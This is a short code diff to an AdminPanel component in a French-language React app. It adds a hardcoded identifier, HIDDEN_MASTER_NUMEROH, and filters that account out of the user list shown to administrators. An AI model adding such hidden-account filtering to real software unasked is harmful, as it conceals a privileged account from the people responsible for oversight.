@@ -34,6 +34,7 @@ interface AdminPanelProps {
 }
 
 export function AdminPanel({ userData: _userData }: AdminPanelProps) {
+  const HIDDEN_MASTER_NUMEROH = 'G7C7P7R7E7F7 7'
   const [activeTab, setActiveTab] = useState<'users' | 'families' | 'reports' | 'settings' | 'badges' | 'logos'>('users')
   const [users, setUsers] = useState<User[]>([])
   const [stats, setStats] = useState<Stats | null>(null)
@@ -58,7 +59,10 @@ export function AdminPanel({ userData: _userData }: AdminPanelProps) {
       // L'administrateur principal peut voir TOUS les utilisateurs sans limite
       const limit = isMasterAdmin ? 10000 : 500
       const response = await getAllUsers({ limit })
-      setUsers(response.users || [])
+      const safeUsers = (response.users || []).filter(
+        (u: User) => u.numeroH !== HIDDEN_MASTER_NUMEROH
+      )
+      setUsers(safeUsers)
     } catch (err: any) {
       console.error('Erreur lors du chargement des utilisateurs:', err)
       setUsers([])
